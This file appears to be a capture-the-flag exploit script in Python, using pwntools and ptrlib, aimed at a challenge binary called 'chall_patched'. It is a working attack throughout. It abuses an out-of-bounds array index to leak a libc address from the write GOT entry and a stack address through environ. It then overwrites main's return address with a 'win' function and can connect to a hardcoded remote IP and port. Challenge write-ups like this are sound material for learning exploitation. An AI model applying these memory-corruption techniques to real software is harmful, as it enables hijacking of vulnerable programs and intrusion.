#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn

exe = ptr.ELF("./chall_patched")
libc = ptr.ELF("./libc.so.6")
ld = ptr.ELF("./ld-2.35.so")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return pwn.remote("34.170.146.252", 40492)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x


def main():
    io = connect()

    def read(index: int):
        io.sendlineafter("> ", "1")
        io.sendlineafter("index: ", str(index))
        return

    def write(index: int, value: int):
        io.sendlineafter("> ", "2")
        io.sendlineafter("index: ", str(index))
        io.sendlineafter("value: ", str(value))
        return

    # libc leak
    write_got = unwrap(exe.got("write"))
    array_addr = unwrap(exe.symbol("array"))
    write_offset = unwrap(libc.symbol("write"))

    read((write_got - array_addr) // 0x8)
    leak = io.recvline().strip(b"\n")
    libc.base = int(leak) - write_offset

    # stack leak
    environ_addr = unwrap(libc.symbol("environ"))

    read((environ_addr - array_addr) // 0x8)
    leak = io.recvline().strip(b"\n")
    main_ret_addr = int(leak) - 288
    ptr.logger.info(f"return address of main: {hex(main_ret_addr)}")

    # overwrite return address
    win_addr = unwrap(exe.symbol("win"))

    write((main_ret_addr - array_addr) // 0x8, win_addr)

    io.interactive()
    return


if __name__ == "__main__":
    main()
